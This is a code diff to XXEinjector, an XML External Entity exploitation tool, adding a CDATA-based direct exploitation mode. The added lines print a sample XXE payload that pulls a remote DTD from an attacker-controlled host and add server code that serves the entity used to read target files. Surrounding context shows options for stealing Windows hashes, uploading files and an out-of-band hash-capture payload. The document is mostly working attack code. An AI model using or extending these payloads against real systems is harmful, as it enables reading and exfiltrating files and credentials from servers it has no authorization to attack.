@@ -26,6 +26,7 @@ $urlencode = "n" # if injected DTD should be URL encoded
 enumall = "n" # if yes XXEinjector will not ask what to enum (prone to false positives) - y/n
 $brute = "" # file with paths to bruteforce
 $direct = "" # if direct exploitation should be used, this parameter should contain unique mark between which results are returned
+cdata = "n" # if XXEinjector should use CDATA while using direct exploitation
 
 hashes = "n" # steal Windows hashes
 upload = "" # upload this file into temp directory using Java jar schema
@@ -106,6 +107,7 @@ ARGV.each do |arg|
 	$port = Integer(arg.split("=")[1]) if arg.include?("--rport=")
 	$remote = arg.split("=")[1] if arg.include?("--rhost=")
 	$test = true if arg.include?("--test")
+	cdata = "y" if arg.include?("--cdata")
 end
 
 # show DTD to inject
@@ -128,6 +130,19 @@ elsif ARGV.include? "--xml"
 	puts ""
 	exit(1)
 
+# show sample direct exploitation XML with CDATA
+elsif ARGV.include? "--cdata-xml"
+	if host == ""
+		host = "YOUR_HOST"
+	end
+	if http_port == ""
+		http_port = "HTTPPORT"
+	end
+	puts ""
+	puts "<!DOCTYPE m [ <!ENTITY % a \"<![CDATA[\"><!ENTITY % local SYSTEM \"XXEINJECT\"><!ENTITY % remote SYSTEM \"http://#{host}:#{http_port}/file.dtd\"><!ENTITY % z \"]]>\">%remote;]><tag>UNIQUEMARK&join;UNIQUEMARK</tag>"
+	puts ""
+	exit(1)
+
 # show main menu
 elsif ARGV.nil? || (ARGV.size < 3 && $logger == "n") || (host == "" && $direct == "" && $logger == "n") || ($file == "" && $logger == "n") || ($path == "" && $brute == "" && hashes == "n" && upload == "" && expect == "" && enumports == "" && $xslt == "n" && $logger == "n")
 	puts "XXEinjector by Jakub Pa\u0142aczy\u0144ski"
@@ -146,6 +161,7 @@ elsif ARGV.nil? || (ARGV.size < 3 && $logger == "n") || (host == "" && $direct =
 	puts ""
 	puts "  --oob		Out of Band exploitation method. FTP is default. FTP can be used in any application. HTTP can be used for bruteforcing and enumeration through directory listing in Java < 1.7 applications. Gopher can only be used in Java < 1.7 applications. (--oob=http/ftp/gopher)"
 	puts "  --direct	Use direct exploitation instead of out of band. Unique mark should be specified as a value for this argument. This mark specifies where results of XXE start and end. Specify --xml to see how XML in request file should look like. (--direct=UNIQUEMARK)"
+	puts "  --cdata	Improve direct exploitation with CDATA. Data is retrieved directly, however OOB is used to construct CDATA payload. Specify --cdata-xml to see how request should look like in this technique."
 	puts "  --2ndfile	File containing valid HTTP request used in second order exploitation. (--2ndfile=/tmp/2ndreq.txt)"
 	puts "  --phpfilter	Use PHP filter to base64 encode target file before sending."
 	puts "  --netdoc	Use netdoc protocol instead of file (Java)."
@@ -255,14 +271,16 @@ def configreq()
 		if turi.include?("XXEINJECT")
 			if $direct != ""
 				$uri = $uri.sub("XXEINJECT", $rproto + ":///#{$directpath}")
+				found = found + 1
 			elsif $xslt == "n"
 				$uri = $uri.sub("XXEINJECT", URI.encode($dtd).gsub("%20", "+"))
+				found = found + 1
 			else
 				$uri = $uri.sub("XXEINJECT", URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
+				found = found + 1
 			end
 			puts "DTD injected." if $verbose == "y"
-			found = found + 1
-		elsif turi.include?("<?xml")
+		elsif turi.include?("<?xml") && $direct == ""
 			if $xslt == "n"
 				$uri = $uri.sub("?>", "?>" + URI.encode($dtd).gsub("%20", "+"))
 				$uri = $uri.sub(/(\?%3e)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
@@ -276,14 +294,15 @@ def configreq()
 					$uri = $uri.sub(/(%3c%3fxml)(.*)(&)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
 					$uri = $uri.sub(/(%3c\?xml)(.*)(&)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
 					$uri = $uri.sub(/(\<%3fxml)(.*)(&)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D") + "&")
+					found = found + 1
 				elsif turi.match(/(\<\?xml)(.*)/i)
 					$uri = $uri.sub(/(\<\?xml)(.*)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
 					$uri = $uri.sub(/(%3c%3fxml)(.*)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
 					$uri = $uri.sub(/(%3c\?xml)(.*)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
 					$uri = $uri.sub(/(\<%3fxml)(.*)/i, URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
+					found = found + 1
 				end
 				puts "DTD injected." if $verbose == "y"
-				found = found + 1
 			end
 		end
 	end
@@ -299,21 +318,23 @@ def configreq()
 				if header.include?("XXEINJECT")
 					if $direct != ""
 						header = header.sub("XXEINJECT", $rproto + ":///#{$directpath}")
+						found = found + 1
 					elsif $urlencode == "y"
 						if $xslt == "n"
 							header = header.sub("XXEINJECT", URI.encode($dtd).gsub("%20", "+").gsub(";", "%3B"))
 						else
 							header = header.sub("XXEINJECT", URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D").gsub(";", "%3B"))
 						end
+						found = found + 1
 					else
 						if $xslt == "n"
 							header = header.sub("XXEINJECT", $dtd)
 						else
 							header = header.sub("XXEINJECT", $xsl)
 						end
+						found = found + 1
 					end
 					puts "DTD injected." if $verbose == "y"
-					found = found + 1
 				end
 			end
 			if header.include?("Accept-Encoding") && $direct != ""
@@ -337,37 +358,40 @@ def configreq()
 				if tline.include?("XXEINJECT") && $xslt == "n"
 					if $direct != ""
 						postline = postline.sub("XXEINJECT", $rproto + ":///#{$directpath}")
+						found = found + 1
 					elsif $urlencode == "y"
 						if $xslt == "n"
 							postline = postline.sub("XXEINJECT", URI.encode($dtd).gsub("%20", "+"))
 						else
 							postline = postline.sub("XXEINJECT", URI.encode($xsl).gsub("%20", "+").gsub("?", "%3F").gsub("=", "%3D"))
 						end
+						found = found + 1
 					else
 						if $xslt == "n"
 							postline = postline.sub("XXEINJECT", $dtd)
 						else
 							postline = postline.sub("XXEINJECT", $xsl)
 						end
+						found = found + 1
 					end
 					puts "DTD injected." if $verbose == "y"
-					found = found + 1
 				elsif tline.include?("XXEINJECT") && $xslt == "y"
 					postfind = 1
-				elsif tline.include?("<?xml") && $xslt == "n"
+				elsif tline.include?("<?xml") && $xslt == "n" && $direct == ""
 					if $urlencode == "y"
 							postline = postline.sub("?>", "?>" + URI.encode($dtd).gsub("%20", "+"))
 							postline = postline.sub(/(\?%3e)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
 							postline = postline.sub(/(%3f>)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
 							postline = postline.sub(/(%3f%3e)/i, '\1' + URI.encode($dtd).gsub("%20", "+"))
+							found = found + 1
 					else
 							postline = postline.sub("?>", "?>" + $dtd)
 							postline = postline.sub(/(\?%3e)/i, '\1' + $dtd)
 							postline = postline.sub(/(%3f>)/i, '\1' + $dtd)
 							postline = postline.sub(/(%3f%3e)/i, '\1' + $dtd)
+							found = found + 1
 					end
 					puts "DTD injected." if $verbose == "y"
-					found = found + 1
 				elsif tline.include?("<?xml") && $xslt == "y"
 					postfind = 1
 				end
@@ -687,7 +711,7 @@ $xsl = "<?xml version=\"1.0\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http:
 
 # Starting servers
 begin
-	if ($xslt == "n" && enumports == "" && $direct == "" && $logger == "n") || ($logger == "y" && enum == "http")
+	if ($xslt == "n" && enumports == "" && $logger == "n") || ($logger == "y" && enum == "http") || ($direct != "" && cdata == "y")
 		http = TCPServer.new http_port
 	end
 	if enum == "ftp" && $xslt == "n" && enumports == "" && $direct == ""
@@ -735,7 +759,10 @@ loop do
 			end
 
 			# respond with proper XML
-			if hashes == "y"
+			if cdata == "y"
+				payload = "<!ENTITY join \"%a;%local;%z;\">"
+				client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
+			elsif hashes == "y"
 				payload = "<!ENTITY % payl \"hashes\">\r\n<!ENTITY % int \"<!ENTITY &#37; trick SYSTEM '#{$rproto}:////#{host}/hash/hash.txt'>\">"
 				client.print("HTTP/1.1 200 OK\r\nContent-Length: #{payload.length}\r\nConnection: close\r\nContent-Type: application/xml\r\n\r\n#{payload}")
 			elsif upload != ""
